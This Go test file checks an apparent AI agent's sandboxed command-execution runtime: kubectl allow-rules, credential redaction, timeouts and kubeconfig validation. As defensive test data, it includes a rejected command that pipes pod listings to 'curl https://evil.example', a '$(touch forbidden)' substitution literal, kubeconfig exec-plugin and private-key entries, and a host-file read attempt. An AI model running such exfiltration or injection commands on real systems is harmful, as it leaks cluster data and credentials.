package execution

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jelly-agent/jelly-agent/internal/sandbox"
)

func testConfig() Config {
	return Config{Enabled: true, Backend: "os", Profiles: []Profile{{Name: "read", Agents: []string{"ops"}}}}
}

func TestRejectedCallsNeverStart(t *testing.T) {
	r := Runtime{Config: testConfig(), run: func(context.Context, sandbox.Policy, sandbox.Spec) (sandbox.Result, error) {
		t.Fatal("denied call started")
		return sandbox.Result{}, nil
	}}
	for _, test := range []struct{ agent, profile, command string }{
		{"ops", "read", "kubectl delete pod x"}, {"ops", "read", "kubectl scale deployment/x --replicas=2"},
		{"other", "read", "kubectl get pods"}, {"ops", "unknown", "kubectl get pods"}, {"ops", "read", "kubectl get pods | curl https://evil.example"},
	} {
		out := r.Execute(t.Context(), test.agent, "session", Request{Command: test.command, Profile: test.profile, Purpose: "diagnose"})
		if out.Executed || out.Decision == Allow || out.ExecID == "" {
			t.Fatalf("bad rejection %+v", out)
		}
	}
	r.Config.Enabled = false
	if out := r.Execute(t.Context(), "ops", "s", Request{Command: "kubectl get pods", Profile: "read", Purpose: "diagnose"}); out.Decision != Forbidden {
		t.Fatalf("disabled %+v", out)
	}
}

func TestCredentialSourcesAreNotRequiredForPolicyCheck(t *testing.T) {
	c := testConfig()
	c.Profiles[0].Env = map[string]string{"TOKEN": "JELLY_EXEC_MISSING_SOURCE"}
	r := Runtime{Config: c}
	req := Request{Command: "kubectl get pods", Profile: "read", Purpose: "diagnose"}
	if out := r.Check("ops", req); out.Decision != Allow {
		t.Fatal(out)
	}
	if out := r.Execute(t.Context(), "ops", "s", req); out.Executed || !strings.Contains(out.Error, "JELLY_EXEC_MISSING_SOURCE") {
		t.Fatal(out)
	}
}

func TestExecutionUsesPrivateWorkspaceScopedEnvAndBoundedTimeout(t *testing.T) {
	// This seam does not disable production preflight. Skip when this host
	// cannot provide the configured sandbox (Linux offline needs Docker).
	if sandbox.CheckStrict(sandbox.Policy{Backend: "os", Mode: sandbox.ModeWorkspace}) != nil {
		t.Skip("OS sandbox cannot enforce this profile")
	}
	t.Setenv("JELLY_EXEC_TOKEN", "secret-value-123456")
	c := testConfig()
	c.TimeoutSec = 10
	c.Profiles[0].Env = map[string]string{"TOKEN": "JELLY_EXEC_TOKEN"}
	var dir string
	r := Runtime{Config: c, run: func(_ context.Context, p sandbox.Policy, s sandbox.Spec) (sandbox.Result, error) {
		dir = s.Dir
		if _, err := os.Stat(dir); err != nil {
			t.Fatal(err)
		}
		if !p.Strict || p.Timeout.Seconds() != 10 || s.Env["TOKEN"] != "secret-value-123456" || len(s.Env) != 1 {
			t.Fatalf("bad envelope %+v %+v", p, s)
		}
		if strings.Contains(strings.Join(s.Argv, " "), s.Env["TOKEN"]) {
			t.Fatal("secret leaked into argv")
		}
		return sandbox.Result{ExitCode: 7, Stdout: "TOKEN=secret-value-123456", Stderr: `{"access_token":"issued-token-value"}`, Backend: "os"}, nil
	}}
	out := r.Execute(t.Context(), "ops", "session", Request{Command: "kubectl get pods", Profile: "read", Purpose: "diagnose", TimeoutSec: 90})
	if !out.Executed || out.ExitCode != 7 || strings.Contains(out.Stdout, "secret-value") || strings.Contains(out.Stderr, "issued-token-value") {
		t.Fatal(out)
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		t.Fatalf("private workspace remains: %s", dir)
	}
}

func TestRuntimeRefusesWeakerBackendBeforeStarting(t *testing.T) {
	c := testConfig()
	c.Backend = "native"
	r := Runtime{Config: c, run: func(context.Context, sandbox.Policy, sandbox.Spec) (sandbox.Result, error) {
		t.Fatal("unconfined process started")
		return sandbox.Result{}, nil
	}}
	if out := r.Execute(t.Context(), "ops", "s", Request{Command: "kubectl get pods", Profile: "read", Purpose: "diagnose"}); out.Executed || out.Decision != Forbidden {
		t.Fatal(out)
	}
}

func TestTruncatedOutputDoesNotLeakPartialCredential(t *testing.T) {
	env := map[string]string{"TOKEN": "credential-123456789"}
	for _, s := range []string{"value=credential-123456789", "value=credential-123"} {
		if got := redact(s, env, true); strings.Contains(got, "credential") {
			t.Fatal(got)
		}
	}
}

func TestRealSandboxExecutor(t *testing.T) {
	if err := sandbox.CheckStrict(sandbox.Policy{Backend: "os", Mode: sandbox.ModeWorkspace}); err != nil {
		t.Skip(err)
	}
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 unavailable")
	}
	t.Setenv("SRE_TOKEN_SOURCE", "readonly-secret-123456")
	t.Setenv("SRE_HOST_SECRET", "unrelated-secret-987654")
	c := testConfig()
	c.MaxOutputKB = 1
	c.Profiles[0].Env = map[string]string{"TOKEN": "SRE_TOKEN_SOURCE"}
	c.Profiles[0].Rules = []Rule{{Name: "test-python", Pattern: []string{"python3", "-c"}, Decision: Allow}, {Name: "test-printf", Pattern: []string{"printf"}, Decision: Allow}, {Name: "test-false", Pattern: []string{"false"}, Decision: Allow}}
	r := Runtime{Config: c}
	invoke := func(command string) Observation {
		return r.Execute(t.Context(), "ops", "test-session", Request{Command: command, Profile: "read", Purpose: "verify executor"})
	}
	out := invoke(`python3 -c 'import os,sys; print(os.environ["TOKEN"]); print(os.environ.get("SRE_HOST_SECRET","absent")); sys.stderr.write("diagnostic error"); sys.exit(7)'`)
	if !out.Executed || out.ExitCode != 7 || !strings.Contains(out.Stdout, "absent") || strings.Contains(out.Stdout, "readonly-secret") || out.Stderr != "diagnostic error" {
		t.Fatalf("real executor: %+v", out)
	}
	out = invoke(`false | printf safe`)
	if out.ExitCode == 0 || out.Stdout != "safe" {
		t.Fatalf("pipeline hid failure: %+v", out)
	}
	out = invoke(`printf '%s' '$(touch forbidden)'`)
	if out.Stdout != "$(touch forbidden)" || out.ExitCode != 0 {
		t.Fatalf("literal changed: %+v", out)
	}
	out = invoke(`python3 -c 'import sys; sys.stdout.write("x"*100000); sys.stderr.write("y"*100000)'`)
	if !out.Truncated || len(out.Stdout) > 1024 || len(out.Stderr) > 1024 {
		t.Fatalf("output not capped: %+v", out)
	}
	protected := filepath.Join(t.TempDir(), "host-secret")
	if err := os.WriteFile(protected, []byte("must-not-be-readable"), 0600); err != nil {
		t.Fatal(err)
	}
	out = invoke(fmt.Sprintf(`python3 -c 'print(open(%q).read())'`, protected))
	if out.ExitCode == 0 || strings.Contains(out.Stdout, "must-not-be-readable") {
		t.Fatalf("host read escaped: %+v", out)
	}
}

func TestInlineKubeconfigRejectsPluginsAndMasksCredentialFields(t *testing.T) {
	valid := "apiVersion: v1\nclusters:\n- name: test\n  cluster:\n    server: https://cluster.example\nusers:\n- name: reader\n  user:\n    token: kube-secret-12345\n"
	t.Setenv("SRE_KUBE", valid)
	dir := t.TempDir()
	secrets, err := materializeKubeconfig("SRE_KUBE", dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := redact("kube-secret-12345", secrets, false); strings.Contains(got, "kube-secret") {
		t.Fatal(got)
	}
	stat, err := os.Stat(filepath.Join(dir, ".kube", "config"))
	if err != nil || stat.Mode().Perm() != 0600 {
		t.Fatal(stat, err)
	}
	for _, bad := range []string{"exec: {command: sh}", "client-key: /root/private.key", "tokenFile: /root/token", "insecure-skip-tls-verify: true"} {
		t.Setenv("SRE_KUBE", "clusters: []\nuser: {"+bad+"}\n")
		if _, err := materializeKubeconfig("SRE_KUBE", t.TempDir()); err == nil {
			t.Fatalf("unsafe kubeconfig accepted: %s", bad)
		}
	}
}
